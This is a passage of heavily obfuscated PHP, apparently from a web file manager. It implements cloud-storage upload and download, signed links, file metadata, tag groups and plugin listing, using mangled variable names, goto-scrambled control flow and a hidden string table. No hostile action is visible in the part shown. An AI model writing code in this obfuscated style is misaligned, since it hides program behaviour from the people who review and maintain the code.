1024 * 1024 * 10; $FøŠß ¾¸Ñ = array($CŒ…ö‡á«[1312], $CŒ…ö‡á«[1313] . $dÇÆëÄ‚’, $CŒ…ö‡á«[1314], $CŒ…ö‡á«[1315] . $e‘Îô¡¢âİ); $bÇ³Œ œˆ = $this->ussRequest($aŒò”ˆ¯‚, $CŒ…ö‡á«[232], !1, $FøŠß ¾¸Ñ); goto bî§±Õòå¦; bî§±Õòå¦: if (!$bÇ³Œ œˆ[$CŒ…ö‡á«[1053]]) { return !1; } $a²¥ßõå·‡ = $bÇ³Œ œˆ[$CŒ…ö‡á«[1055]]; $cŸ¬ì†˜Şç = 0; goto DÏ¿‹ÙËÎ«; DÏ¿‹ÙËÎ«: $E¯Ÿ¹›÷ ¹ = $a²¥ßõå·‡[$CŒ…ö‡á«[1316]]; $d¾ÄÆƒ†ğ = fopen($AÛìÆªíÅ¿, $CŒ…ö‡á«[1221]); if (!$d¾ÄÆƒ†ğ) { return !1; } goto FŸ±„ÆàÖ¿; FŸ±„ÆàÖ¿: do { $Fë¤‘æ„•· = $a²¥ßõå·‡[$CŒ…ö‡á«[1317]]; fseek_64($d¾ÄÆƒ†ğ, $cŸ¬ì†˜Şç); $B”ßµ¤ˆŸå = fread($d¾ÄÆƒ†ğ, $Fë¤‘æ„•·); $böå‰ÅøÑÙ = 0; do { $böå‰ÅøÑÙ++; $a²¥ßõå·‡ = $this->uploadPart($aŒò”ˆ¯‚, $a²¥ßõå·‡, $B”ßµ¤ˆŸå); } while (!$a²¥ßõå·‡ && $böå‰ÅøÑÙ < 3); if (!$a²¥ßõå·‡) { return !1; } $E¯Ÿ¹›÷ ¹ = $a²¥ßõå·‡[$CŒ…ö‡á«[1316]]; $cŸ¬ì†˜Şç += $Fë¤‘æ„•·; } while ($E¯Ÿ¹›÷ ¹ != -1); fclose($d¾ÄÆƒ†ğ); $FøŠß ¾¸Ñ = array($CŒ…ö‡á«[1318], $CŒ…ö‡á«[1319] . $a²¥ßõå·‡[$CŒ…ö‡á«[1320]], $CŒ…ö‡á«[1314]); goto BçÙ·ÙŞ¡; Bœ½ŸÂì°‘: } private function uploadPart($aÕÜ¸‹……Û, $CŞÙÔ¥¢êÁ, &$cÅÕ”é Á¡) { $bÖ’¶†¾ =& $_SERVER[¢Í]; $a®ØŞÃˆ… = array($bÖ’¶†¾[1321], $bÖ’¶†¾[1319] . $CŞÙÔ¥¢êÁ[$bÖ’¶†¾[1320]], $bÖ’¶†¾[1322] . $CŞÙÔ¥¢êÁ[$bÖ’¶†¾[1316]], $bÖ’¶†¾[148] . $CŞÙÔ¥¢êÁ[$bÖ’¶†¾[1317]]); $B–«ÒÄ¶º = $this->ussRequest($aÕÜ¸‹……Û, $bÖ’¶†¾[232], $cÅÕ”é Á¡, $a®ØŞÃˆ…); return !$B–«ÒÄ¶º[$bÖ’¶†¾[1053]] ? $B–«ÒÄ¶º[$bÖ’¶†¾[1053]] : $B–«ÒÄ¶º[$bÖ’¶†¾[1055]]; } public function uploadFormData($eËŒáêŒÆ, $B·‘ÄÕÄË = 3600) { return $this->uploadPolicy($eËŒáêŒÆ, $B·‘ÄÕÄË); } public function multiUploadFormData($Dã¡ÛÀğÄŒ, $e‹ª‡ø¯§’ = 3600) { $f¢óùŠÚõø =& $_SERVER[¢Í]; $dñŞôÙÉÛ = (int) $GLOBALS[$f¢óùŠÚõø[7]][$f¢óùŠÚõø[87]]; return $this->uploadPolicy($Dã¡ÛÀğÄŒ, $e‹ª‡ø¯§’, $dñŞôÙÉÛ); } private function uploadPolicy($B¥ßÓ£òÁ¶, $fŞŒØƒ‚ĞÉ = 3600, $C³¯Ó‡¦ÏĞ = 0) { goto AÑ‚ì¤õªÓ; BÕ­ó”‚Ì°: $Dô½—´êÖ = array($EÈ¥²ëá‘[1323] => $this->bucket, $EÈ¥²ëá‘[1324] => $B¥ßÓ£òÁ¶, $EÈ¥²ëá‘[1325] => time() + $fŞŒØƒ‚ĞÉ, $EÈ¥²ëá‘[1326] => $b¹ÏÓÎ£ƒ); if ($C³¯Ó‡¦ÏĞ) { $Dô½—´êÖ[$EÈ¥²ëá‘[1237]] = $C³¯Ó‡¦ÏĞ; } $bÂÕ•Ì·Æì = base64_encode(json_encode($Dô½—´êÖ)); goto DßšÄŸ®Œ; AÑ‚ì¤õªÓ: $EÈ¥²ëá‘ =& $_SERVER[¢Í]; $aÀ‡‘´Ò‚Ÿ = $EÈ¥²ëá‘[8] . $this->bucket; $b¹ÏÓÎ£ƒ = gmdate($EÈ¥²ëá‘[1258]); goto BÕ­ó”‚Ì°; DßšÄŸ®Œ: $aô÷‚áµ¨Ê = base64_encode(hash_hmac($EÈ¥²ëá‘[1293], "\x50\117\x53\x54\x26{$aÀ‡‘´Ò‚Ÿ}\46{$b¹ÏÓÎ£ƒ}\x26{$bÂÕ•Ì·Æì}", md5("{$this->userpass}"), !0)); $e¥…šÄº³ = array($EÈ¥²ëá‘[1164] => $bÂÕ•Ì·Æì, $EÈ¥²ëá‘[1327] => "\x55\120\x59\x55\116\x20{$this->username}\72{$aô÷‚áµ¨Ê}", $EÈ¥²ëá‘[183] => $this->endpoint . $aÀ‡‘´Ò‚Ÿ); return $e¥…šÄº³; goto dÚùÎ…Š´ô; dÚùÎ…Š´ô: } public function download($AÖ•ÚÖ“¤¸, $Dã¦²Šˆ§) { goto aª¸¤Úêõ; CóÂïµõé—: fclose($c‰Êù»Å÷Œ); return $Dã¦²Šˆ§; goto cÒ´ì‰Üä«; aª¸¤Úêõ: $eÅ¥ƒ»ö­Ú = IO::getPathInner(IO::mkfile($Dã¦²Šˆ§)); if (!($Fßµâ¹‰± = $this->link($AÖ•ÚÖ“¤¸))) { return !1; } $Aî±ÍùÅê = 0; goto EÂ½ãÒ£ì; EÂ½ãÒ£ì: $EÆ‡¹½¤Œ = 1024 * 200; $c‰Êù»Å÷Œ = fopen($eÅ¥ƒ»ö­Ú, $_SERVER[¢Í][1277]); while (!0) { $c…ˆ•áÇ±– = $this->fileSubstr($AÖ•ÚÖ“¤¸, $Aî±ÍùÅê, $EÆ‡¹½¤Œ); if ($c…ˆ•áÇ±– === !1) { return !1; } fwrite($c‰Êù»Å÷Œ, $c…ˆ•áÇ±–); $Aî±ÍùÅê += $EÆ‡¹½¤Œ; if (strlen($c…ˆ•áÇ±–) < $EÆ‡¹½¤Œ) { break; } } goto CóÂïµõé—; cÒ´ì‰Üä«: } public function link($E·í’Áè…â, $b”ªœòæÙ† = array()) { $dÊ Î®†©´ =& $_SERVER[¢Í]; $E·í’Áè…â = trim($E·í’Áè…â, $dÊ Î®†©´[8]); if (!empty($this->token)) { $aóˆÑŒ‘Ñ¾ = strtotime(date($dÊ Î®†©´[1328])); $eæØ‚šéç¯ = substr(md5($this->token . $dÊ Î®†©´[287] . $aóˆÑŒ‘Ñ¾ . $dÊ Î®†©´[1329] . $E·í’Áè…â), 12, 8) . $aóˆÑŒ‘Ñ¾; $b”ªœòæÙ†[] = $dÊ Î®†©´[1330] . $eæØ‚šéç¯; } $cˆòóëÍ = !empty($b”ªœòæÙ†) ? $dÊ Î®†©´[79] . implode($dÊ Î®†©´[287], $b”ªœòæÙ†) : $dÊ Î®†©´[33]; return $this->getHost() . $dÊ Î®†©´[8] . $E·í’Áè…â . $cˆòóëÍ; } public function fileOut($a×ˆ©ï¦È, $fÌ¨æªóáñ = false, $cÚÆ—ïó×‘ = false, $E¢ì¯´Ë¸ì = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($a×ˆ©ï¦È, $fÌ¨æªóáñ, $cÚÆ—ïó×‘, $E¢ì¯´Ë¸ì); } if (!$cÚÆ—ïó×‘) { $cÚÆ—ïó×‘ = $this->pathThis($a×ˆ©ï¦È); } $E ’©ˆ‹µã = $fÌ¨æªóáñ ? array($_SERVER[¢Í][1331] . rawurlencode($cÚÆ—ïó×‘)) : array(); $D¼£‹Ò©¬ = $this->link($a×ˆ©ï¦È, $E ’©ˆ‹µã); $this->fileOutLink($D¼£‹Ò©¬); } public function fileOutServer($B…êïã…ˆø, $Aœøäö©çá = false, $b·¨•¯àßŸ = false, $D‰éºÃ”ìÒ = '') { parent::fileOut($B…êïã…ˆø, $Aœøäö©çá, $b·¨•¯àßŸ, $D‰éºÃ”ìÒ); } public function fileOutImage($c‡Ú¾Å”‰Ã, $càºâ¸‘ç = 250) { $FÛê££Ë¦™ = $this->link($c‡Ú¾Å”‰Ã . $_SERVER[¢Í][1332] . $càºâ¸‘ç); $this->fileOutLink($FÛê££Ë¦™); } public function fileOutImageServer($b†ãÈºŞ, $cèÒİğ·ğê = 250) { parent::fileOutImage($b†ãÈºŞ, $cèÒİğ·ğê); } public function hashMd5($DéŠ÷İÃùÁ) { $f¸¸–’Ñá˜ =& $_SERVER[¢Í]; $EçÖôÛÛÜŞ = $this->_objectMeta($DéŠ÷İÃùÁ); return isset($EçÖôÛÛÜŞ[$f¸¸–’Ñá˜[214]]) ? $EçÖôÛÛÜŞ[$f¸¸–’Ñá˜[214]] : !1; } public function size($DÄÑö“¶Ìé) { $aÎ¯ÂÎß´ = $this->objectMeta($DÄÑö“¶Ìé); return $aÎ¯ÂÎß´ ? $aÎ¯ÂÎß´[$_SERVER[¢Í][87]] : 0; } public function info($A¨²‹‘šÁ) { if ($this->isFolder($A¨²‹‘šÁ)) { return $this->folderInfo($A¨²‹‘šÁ); } else { if ($this->isFile($A¨²‹‘šÁ)) { return $this->fileInfo($A¨²‹‘šÁ); } } return !1; } public function exist($aù‹è±ìĞ) { return $this->isFile($aù‹è±ìĞ) || $this->isFolder($aù‹è±ìĞ); } public function isFile($bŸãÑ“ÊĞÖ) { return !$this->isFolder($bŸãÑ“ÊĞÖ) && $this->objectMeta($bŸãÑ“ÊĞÖ); } public function isFolder($aŠèÛ”‚) { return $this->cacheMethod($_SERVER[¢Í][205], $aŠèÛ”‚); } protected function objectMeta($C•ø¹œÜÎ) { return $this->cacheMethod($_SERVER[¢Í][206], $C•ø¹œÜÎ); } protected function _objectMeta($c‡ë‚¥ ÆÉ) { goto eÅ¶âÕÀ˜; fÓÔÃÕ‘å·: if (!$AÖœˆ…ÃÜ“[$FŒÀ¦ÉôÕ[1053]]) { return null; } $aÀãÃøì© = isset($AÖœˆ…ÃÜ“[$FŒÀ¦ÉôÕ[1055]]) ? $AÖœˆ…ÃÜ“[$FŒÀ¦ÉôÕ[1055]] : array(); if (!isset($aÀãÃøì©[$FŒÀ¦ÉôÕ[1334]])) { return null; } goto Fùôéœœ§; eÅ¶âÕÀ˜: $FŒÀ¦ÉôÕ =& $_SERVER[¢Í]; if ($c‡ë‚¥ ÆÉ == $FŒÀ¦ÉôÕ[33] || $c‡ë‚¥ ÆÉ == $FŒÀ¦ÉôÕ[8]) { return array(); } $AÖœˆ…ÃÜ“ = $this->ussRequest($c‡ë‚¥ ÆÉ, $FŒÀ¦ÉôÕ[1333]); goto fÓÔÃÕ‘å·; Fùôéœœ§: $DÖ¸±Àšà = array($FŒÀ¦ÉôÕ[29] => isset($aÀãÃøì©[$FŒÀ¦ÉôÕ[1334]]) ? $aÀãÃøì©[$FŒÀ¦ÉôÕ[1334]] : null, $FŒÀ¦ÉôÕ[87] => isset($aÀãÃøì©[$FŒÀ¦ÉôÕ[1335]]) ? $aÀãÃøì©[$FŒÀ¦ÉôÕ[1335]] : null, $FŒÀ¦ÉôÕ[214] => isset($aÀãÃøì©[$FŒÀ¦ÉôÕ[1336]]) ? $aÀãÃøì©[$FŒÀ¦ÉôÕ[1336]] : null, $FŒÀ¦ÉôÕ[1303] => isset($aÀãÃøì©[$FŒÀ¦ÉôÕ[1337]]) ? $aÀãÃøì©[$FŒÀ¦ÉôÕ[1337]] : null); $DÖ¸±Àšà[$FŒÀ¦ÉôÕ[1304]] = isset($aÀãÃøì©[$FŒÀ¦ÉôÕ[1338]]) ? strtotime($aÀãÃøì©[$FŒÀ¦ÉôÕ[1338]]) : $DÖ¸±Àšà[$FŒÀ¦ÉôÕ[1303]]; return $DÖ¸±Àšà; goto DìÂæ«—Šˆ; DìÂæ«—Šˆ: } protected function _isFolder($DùĞÚù†­Ë) { $C‘ÖÈÔªÜ‘ =& $_SERVER[¢Í]; if ($DùĞÚù†­Ë == $C‘ÖÈÔªÜ‘[33] || $DùĞÚù†­Ë == $C‘ÖÈÔªÜ‘[8]) { return !0; } $b¿«ÚÜ‚ÉÀ = $this->_objectMeta($DùĞÚù†­Ë); return isset($b¿«ÚÜ‚ÉÀ[$C‘ÖÈÔªÜ‘[29]]) && $b¿«ÚÜ‚ÉÀ[$C‘ÖÈÔªÜ‘[29]] == $C‘ÖÈÔªÜ‘[86] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Fª„¾´ãËô = false) { } public function exist($D–¹­æÖö) { $b­öÕïÃ = $this->info($D–¹­æÖö); return $b­öÕïÃ[$_SERVER[¢Í][201]]; } public function isFile($DÚáœÌ›ç) { $fˆß¯Ó—â¤ = $this->info($DÚáœÌ›ç); return $fˆß¯Ó—â¤[$_SERVER[¢Í][201]]; } public function isFolder($F²‰×ÎÔ¡²) { return !1; } public function size($C‰ôçÇ‹ç¦) { $aœ½¹„‰ø­ = $this->info($C‰ôçÇ‹ç¦); return $aœ½¹„‰ø­[$_SERVER[¢Í][87]]; } public function info($eÂİÓ”) { return $this->infoParse($eÂİÓ”); } public function infoAuth($f¼‹ğÍºÑ) { return $this->infoParse($f¼‹ğÍºÑ); } public function infoWithChildren($CİÙ»Ó‡ Ì) { return $this->infoParse($CİÙ»Ó‡ Ì); } public function infoFull($d¹©ÖŠ›•„) { return $this->infoParse($d¹©ÖŠ›•„); } private function infoParse($eñ¼š¸¾ˆ) { $AºîŞÊÒïÈ =& $_SERVER[¢Í]; $a×ìó¤Ç„õ = $this->header($eñ¼š¸¾ˆ); if (!$a×ìó¤Ç„õ || !$a×ìó¤Ç„õ[$AºîŞÊÒïÈ[703]]) { return !1; } $B¢¶Æ½¤ = _get($a×ìó¤Ç„õ, $AºîŞÊÒïÈ[340], 0); $aƒìÖ´ªÎÈ = array($AºîŞÊÒïÈ[28] => $a×ìó¤Ç„õ[$AºîŞÊÒïÈ[28]], $AºîŞÊÒïÈ[85] => $eñ¼š¸¾ˆ, $AºîŞÊÒïÈ[29] => $AºîŞÊÒïÈ[181], $AºîŞÊÒïÈ[87] => intval($B¢¶Æ½¤), $AºîŞÊÒïÈ[175] => get_path_ext($a×ìó¤Ç„õ[$AºîŞÊÒïÈ[28]]), $AºîŞÊÒïÈ[1218] => $B¢¶Æ½¤ > 0 && $a×ìó¤Ç„õ[$AºîŞÊÒïÈ[1339]], $AºîŞÊÒïÈ[1219] => !1); return $aƒìÖ´ªÎÈ; } private function header($EÄÒÕ‡¿´¨) { goto bºæèÃÁµ; bºæèÃÁµ: $Fß¢–Ç´À =& $_SERVER[¢Í]; if (isset(self::$_cacheHeader[$EÄÒÕ‡¿´¨])) { return self::$_cacheHeader[$EÄÒÕ‡¿´¨]; } $e¹¡™‚ÁÊÂ = isset($GLOBALS[$Fß¢–Ç´À[1340]]) ? $GLOBALS[$Fß¢–Ç´À[1340]] : !1; goto f½Ü‹ù»; f½Ü‹ù»: $GLOBALS[$Fß¢–Ç´À[1340]] = !0; self::$_cacheHeader[$EÄÒÕ‡¿´¨] = url_header($EÄÒÕ‡¿´¨); $GLOBALS[$Fß¢–Ç´À[1340]] = $e¹¡™‚ÁÊÂ; goto Bñ³ªéùã; Bñ³ªéùã: return self::$_cacheHeader[$EÄÒÕ‡¿´¨]; goto Fè‹ŠÓÁòå; Fè‹ŠÓÁòå: } public function hashSimple($eæ²¤Ê™õ, $BÇ“èôÄÏÈ = false) { goto DùÚ¹áƒ¯‚; BŸøòãÚŸ»: $BÇšá†ß„¸ .= $this->fileSubstr($eæ²¤Ê™õ, $cóÈ·Û¤Ü - $EÇğ¼ĞŸŠ•, $EÇğ¼ĞŸŠ•); return md5($BÇšá†ß„¸) . $cóÈ·Û¤Ü; goto DàØ¡ÄÆğ¾; DùÚ¹áƒ¯‚: $b¾¬ø’· =& $_SERVER[¢Í]; $fîÈğ˜õ»† = $this->info($eæ²¤Ê™õ); if (!$fîÈğ˜õ»† || !$fîÈğ˜õ»†[$b¾¬ø’·[201]]) { return !1; } goto aÃª¦æ²í¾; aÃª¦æ²í¾: $cóÈ·Û¤Ü = $fîÈğ˜õ»†[$b¾¬ø’·[87]]; $EÇğ¼ĞŸŠ• = 200; $B‘„ÖÉô‡² = 50; goto cİÉŒ‰¼„—; cİÉŒ‰¼„—: if ($cóÈ·Û¤Ü <= $EÇğ¼ĞŸŠ• * $B‘„ÖÉô‡²) { return md5($this->fileSubstr($eæ²¤Ê™õ, 0, $cóÈ·Û¤Ü)) . $cóÈ·Û¤Ü; } $aßÚ—Š•™ = intval($cóÈ·Û¤Ü / $B‘„ÖÉô‡²); $BÇšá†ß„¸ = $b¾¬ø’·[33]; goto Dµ‚ğ»ïªÏ; Dµ‚ğ»ïªÏ: $a‰»Û·Ú­Ò = timeFloat(); $EÁ‹÷±Şô = 15; for ($AÆ–¿¼åÛÊ = 0; $AÆ–¿¼åÛÊ < $B‘„ÖÉô‡²; $AÆ–¿¼åÛÊ++) { if (timeFloat() - $a‰»Û·Ú­Ò > $EÁ‹÷±Şô) { return !1; } $fÁÊ«î‚‹¦ = $this->fileSubstr($eæ²¤Ê™õ, $aßÚ—Š•™ * $AÆ–¿¼åÛÊ, $EÇğ¼ĞŸŠ•); if (!$fÁÊ«î‚‹¦) { return !1; } $BÇšá†ß„¸ .= $fÁÊ«î‚‹¦; } goto BŸøòãÚŸ»; DàØ¡ÄÆğ¾: } public function getContent($Dİµ«ÃÏß§) { return $this->fileSubstr($Dİµ«ÃÏß§); } public function fileSubstr($F‚ó† ×‰´, $E÷ò³àå£™ = 0, $fÀ²½Åõ¹Û = -1) { goto aÁâ‘³¥ƒá; a‚÷®÷öÍ—: $bå “ƒÍ´‘ = url_request($F‚ó† ×‰´, $B•ÇÜ‰ù„Ä[234], !1, $E‡¡‡äŒ‘è, !1, !1, 1); return $bå “ƒÍ´‘[$B•ÇÜ‰ù„Ä[1055]] ? $bå “ƒÍ´‘[$B•ÇÜ‰ù„Ä[1055]] : $B•ÇÜ‰ù„Ä[33]; goto Eñ‰Ø¥‚—½; aÁâ‘³¥ƒá: $B•ÇÜ‰ù„Ä =& $_SERVER[¢Í]; $cµ²äÙà¿Ú = $this->info($F‚ó† ×‰´); if (!$cµ²äÙà¿Ú || !$cµ²äÙà¿Ú[$B•ÇÜ‰ù„Ä[201]] && $cµ²äÙà¿Ú[$B•ÇÜ‰ù„Ä[87]] > 1024 * 1024 * 10) { return !1; } goto c÷½›É›´; c÷½›É›´: if ($fÀ²½Åõ¹Û === -1) { $fÀ²½Åõ¹Û = $cµ²äÙà¿Ú[$B•ÇÜ‰ù„Ä[87]]; } if ($fÀ²½Åõ¹Û == 0) { return $B•ÇÜ‰ù„Ä[33]; } $E‡¡‡äŒ‘è = array($B•ÇÜ‰ù„Ä[1341] . $E÷ò³àå£™ . $B•ÇÜ‰ù„Ä[729] . ($E÷ò³àå£™ + $fÀ²½Åõ¹Û - 1)); goto a‚÷®÷öÍ—; Eñ‰Ø¥‚—½: } public function download($a—ĞôµÙù¤, $DŸáñŒÎƒ) { Downloader::start($a—ĞôµÙù¤, $DŸáñŒÎƒ); return $DŸáñŒÎƒ; } } goto a›ÎÔ÷¿Ô; AËğ½îéÒö: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($dĞÙá’Å˜Ş) { $E‚…ù›ƒâë =& $_SERVER[¢Í]; return array($E‚…ù›ƒâë[1746] => array($dĞÙá’Å˜Ş[0], $E‚…ù›ƒâë[1747]), $E‚…ù›ƒâë[1748] => array($dĞÙá’Å˜Ş[0], $E‚…ù›ƒâë[1749])); } protected function get($D‚÷ˆ½÷›ñ) { $eÔ±ªÅìõš =& $_SERVER[¢Í]; $F§øœµâÏ¼ = Model($eÔ±ªÅìõš[484])->metaGet($D‚÷ˆ½÷›ñ, $eÔ±ªÅìõš[1750]); $b§ñ¤ÏšƒÁ = json_decode($F§øœµâÏ¼, !0); return $b§ñ¤ÏšƒÁ ? $b§ñ¤ÏšƒÁ : array($eÔ±ªÅìõš[1751] => $eÔ±ªÅìõš[93], $eÔ±ªÅìõš[370] => array()); } protected function set($f†ÒÚÏÈ´Ï, $f‘‚¸âÅ–Ò) { $BøÒ¯š›†è =& $_SERVER[¢Í]; $f‘‚¸âÅ–Ò = $f‘‚¸âÅ–Ò ? $f‘‚¸âÅ–Ò : array($BøÒ¯š›†è[1751] => $BøÒ¯š›†è[93], $BøÒ¯š›†è[370] => array()); Model($BøÒ¯š›†è[484])->metaSet($f†ÒÚÏÈ´Ï, $BøÒ¯š›†è[1750], json_encode($f‘‚¸âÅ–Ò)); return Model($BøÒ¯š›†è[484])->metaSet($f†ÒÚÏÈ´Ï, $BøÒ¯š›†è[1750], json_encode($f‘‚¸âÅ–Ò)); } protected function getByTagID($CÔ¸×‡Ø‡æ, $eò„¥Ô¬‚±) { goto cæº„í£“¡; eÇÁÅáÜ ö: $FÔ¨Ù»ª¦­ = $this->get($CÔ¸×‡Ø‡æ); if (!$FÔ¨Ù»ª¦­ || !isset($FÔ¨Ù»ª¦­[$aØÎ”Ÿš›Ş[370]])) { return !1; } $AƒõºªÒ™â = array_find_by_field($FÔ¨Ù»ª¦­[$aØÎ”Ÿš›Ş[370]], $aØÎ”Ÿš›Ş[392], $eò„¥Ô¬‚±); goto c÷¬â¢à¹­; c÷¬â¢à¹­: return is_array($AƒõºªÒ™â) ? $AƒõºªÒ™â : !1; goto e©œ²ƒ†²; cæº„í£“¡: $aØÎ”Ÿš›Ş =& $_SERVER[¢Í]; if (!$CÔ¸×‡Ø‡æ || !$eò„¥Ô¬‚±) { return !1; } if (!Model($aØÎ”Ÿš›Ş[484])->getInfoSimple($CÔ¸×‡Ø‡æ)) { return !1; } goto eÇÁÅáÜ ö; e©œ²ƒ†²: } public function listSource($cäæ öª‡¶, $c„Ææ×ÔÉ„) { goto f›ŒìöÎ£; e±ÊãŒãö‘: if (!$BÔÌ¹¥á¶ || count($d‰Ù–ˆí±) == $BÔÌ¹¥á¶[$f¤¦§í»¯î[367]][$f¤¦§í»¯î[368]]) { return $BÔÌ¹¥á¶; } $Aœ¯ñÚ£ = array(); $Eˆä»ªÔ‰™ = array_to_keyvalue($BÔÌ¹¥á¶[$f¤¦§í»¯î[84]], $f¤¦§í»¯î[33], $f¤¦§í»¯î[394]); goto E—ÖÛÌ™âÏ; E—ÖÛÌ™âÏ: $a©ÓÃèö¨¶ = array_to_keyvalue($BÔÌ¹¥á¶[$f¤¦§í»¯î[83]], $f¤¦§í»¯î[33], $f¤¦§í»¯î[394]); $F¾¥ˆá„¬ = array_merge($a©ÓÃèö¨¶, $Eˆä»ªÔ‰™); foreach ($d‰Ù–ˆí± as $aŸ°™çØ¶‚) { if (!in_array($aŸ°™çØ¶‚, $F¾¥ˆá„¬)) { $Aœ¯ñÚ£[] = $aŸ°™çØ¶‚; } } goto AÉĞŒñ¿‘; f›ŒìöÎ£: $f¤¦§í»¯î =& $_SERVER[¢Í]; if ($c„Ææ×ÔÉ„ && !is_array($c„Ææ×ÔÉ„)) { $c„Ææ×ÔÉ„ = array($c„Ææ×ÔÉ„); } $Bª… †Í„“ = $this->listData($cäæ öª‡¶); goto Dì‰ƒÙ¼ì; AÉĞŒñ¿‘: if ($Aœ¯ñÚ£) { $this->removeBySource($cäæ öª‡¶, $Aœ¯ñÚ£); } return $BÔÌ¹¥á¶; goto Eçß¡Ù¹; fë²ÑÔ»‡¨: foreach ($aËÃ›Â‡–ğ as $cÒ¤Åõâ²… => $C¥³‚ƒš‹) { $FĞÕÜé‚œÃ = !0; if (!$c„Ææ×ÔÉ„) { $d‰Ù–ˆí±[] = $cÒ¤Åõâ²…; continue; } foreach ($c„Ææ×ÔÉ„ as $fâ¥î­®¨¾) { if (!in_array($fâ¥î­®¨¾, $C¥³‚ƒš‹)) { $FĞÕÜé‚œÃ = !1; break; } } if ($FĞÕÜé‚œÃ) { $d‰Ù–ˆí±[] = $cÒ¤Åõâ²…; } } if (!$d‰Ù–ˆí±) { return array(); } $BÔÌ¹¥á¶ = Model($f¤¦§í»¯î[1169])->listSource(array($f¤¦§í»¯î[408] => array($f¤¦§í»¯î[409], $d‰Ù–ˆí±))); goto e±ÊãŒãö‘; Dì‰ƒÙ¼ì: $aËÃ›Â‡–ğ = array(); foreach ($Bª… †Í„“ as $Aª”Òâ˜ù) { $aŸ°™çØ¶‚ = $Aª”Òâ˜ù[$f¤¦§í»¯î[85]]; if (!$aŸ°™çØ¶‚) { continue; } if (!isset($aËÃ›Â‡–ğ[$aŸ°™çØ¶‚])) { $aËÃ›Â‡–ğ[$aŸ°™çØ¶‚] = array(); } $aËÃ›Â‡–ğ[$aŸ°™çØ¶‚][] = $Aª”Òâ˜ù[$f¤¦§í»¯î[418]]; } $d‰Ù–ˆí± = array(); goto fë²ÑÔ»‡¨; Eçß¡Ù¹: } protected function listData($E®­Ô…ˆ´¨) { $BóĞµâ äØ =& $_SERVER[¢Í]; $EÓàä¢£§ = array($BóĞµâ äØ[1481] => 0, $BóĞµâ äØ[460] => array($BóĞµâ äØ[1752], 0), $BóĞµâ äØ[413] => $BóĞµâ äØ[1753] . $E®­Ô…ˆ´¨); $d“¯¡º§Ë = $BóĞµâ äØ[1754]; $AÆòˆŒ¬ô = $this->field($d“¯¡º§Ë)->where($EÓàä¢£§)->order($BóĞµâ äØ[1755])->select(); return $AÆòˆŒ¬ô ? $AÆòˆŒ¬ô : array(); } protected function addToTag($c×¨Å¾éÓ¸, $d‘İÒçåÅ, $d“­ê’¯¿À) { $B¶ÅçÒñ¤ =& $_SERVER[¢Í]; if (!$this->getByTagID($c×¨Å¾éÓ¸, $d“­ê’¯¿À) || !$d‘İÒçåÅ) { return !1; } if (!Model($B¶ÅçÒñ¤[765])->pathInfo($d‘İÒçåÅ)) { return !1; } $Bçõ¾¾ö = array($B¶ÅçÒñ¤[1481] => 0, $B¶ÅçÒñ¤[460] => $d“­ê’¯¿À, $B¶ÅçÒñ¤[412] => $d‘İÒçåÅ, $B¶ÅçÒñ¤[413] => $B¶ÅçÒñ¤[1756] . $c×¨Å¾éÓ¸, $B¶ÅçÒñ¤[411] => $B¶ÅçÒñ¤[33], $B¶ÅçÒñ¤[1652] => 0); if ($this->where($Bçõ¾¾ö)->find()) { return !1; } return $this->add($Bçõ¾¾ö); } protected function removeFromTag($fÌóô¨¦ôó, $cÀ‘ÓÒ”¯½, $d‡èƒ‘†ĞÏ) { $d…İ÷µÑ¨ˆ =& $_SERVER[¢Í]; if (!$this->getByTagID($fÌóô¨¦ôó, $d‡èƒ‘†ĞÏ) || !$cÀ‘ÓÒ”¯½) { return !1; } if (is_array($cÀ‘ÓÒ”¯½)) { $cÀ‘ÓÒ”¯½ = array($d…İ÷µÑ¨ˆ[7], $cÀ‘ÓÒ”¯½); } $aé¼‹çĞì¿ = array($d…İ÷µÑ¨ˆ[1481] => 0, $d…İ÷µÑ¨ˆ[460] => $d‡èƒ‘†ĞÏ, $d…İ÷µÑ¨ˆ[413] => $d…İ÷µÑ¨ˆ[1756] . $fÌóô¨¦ôó, $d…İ÷µÑ¨ˆ[412] => $cÀ‘ÓÒ”¯½); return $this->where($aé¼‹çĞì¿)->delete(); } protected function removeByTag($Bµªó‡¢, $fÏ¯„Ó¶áÂ) { $BÛšÔ£óÆ =& $_SERVER[¢Í]; if (!$this->getByTagID($Bµªó‡¢, $fÏ¯„Ó¶áÂ)) { return !1; } $c›Ş›Í¿åª = array($BÛšÔ£óÆ[1481] => 0, $BÛšÔ£óÆ[460] => $fÏ¯„Ó¶áÂ, $BÛšÔ£óÆ[413] => $BÛšÔ£óÆ[1756] . $Bµªó‡¢); return $this->where($c›Ş›Í¿åª)->delete(); } protected function removeBySource($dÒïçÍ‡…“, $fÖõáã¨¥») { $BÂğñî•ƒƒ =& $_SERVER[¢Í]; if (!$dÒïçÍ‡…“ || !$fÖõáã¨¥») { return !1; } if (is_array($fÖõáã¨¥»)) { $fÖõáã¨¥» = array($BÂğñî•ƒƒ[7], $fÖõáã¨¥»); } $aŸ”ª‹‹¤ = array($BÂğñî•ƒƒ[1481] => 0, $BÂğñî•ƒƒ[412] => $fÖõáã¨¥», $BÂğñî•ƒƒ[460] => array($BÂğñî•ƒƒ[939], 0), $BÂğñî•ƒƒ[413] => $BÂğñî•ƒƒ[1756] . $dÒïçÍ‡…“); return $this->where($aŸ”ª‹‹¤)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\160\x6c\x75\147\151\156\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\x73\x74\141\x74\x75\x73", "\162\145\x67\151\145\x73\x74", "\143\x6f\156\x66\x69\x67"); public function loadList($Cº­ù¿¥­… = false) { $fÛ»éÆÀÇñ = array_to_keyvalue($this->listData(), $_SERVER[¢Í][28]); if ($Cº­ù¿¥­…) { return $fÛ»éÆÀÇñ[$Cº­ù¿¥­…]; } return $fÛ»éÆÀÇñ; } public function init() { $fïºĞ±‘‘é =& $_SERVER[¢Í]; Hook::trigger($fïºĞ±‘‘é[1757]); $eÒèÏèêˆ = $this->loadPluginList(); foreach ($eÒèÏèêˆ as $e¹èˆÇÌë¨ => $Dİ…ğèÆÓÀ) { $fÆô¢ë‘ê = $this->appAllow($e¹èˆÇÌë¨, $Dİ…ğèÆÓÀ); if (!$fÆô¢ë‘ê) { continue; } foreach 